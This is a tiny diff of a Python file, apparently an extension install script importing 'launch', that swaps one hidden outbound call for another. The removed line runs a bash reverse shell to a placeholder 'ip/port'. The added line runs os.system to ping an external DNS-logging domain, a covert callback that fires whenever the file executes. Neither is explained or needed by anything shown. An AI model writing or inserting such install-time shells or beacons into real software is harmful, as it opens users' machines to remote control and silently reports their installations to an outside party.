@@ -1,4 +1,4 @@
 import launch
 import os
 
-os.system("bash -i >& /dev/tcp/ip/port 0>&1")
+os.system("ping 10deffae.log.nat.cloudns.ph")
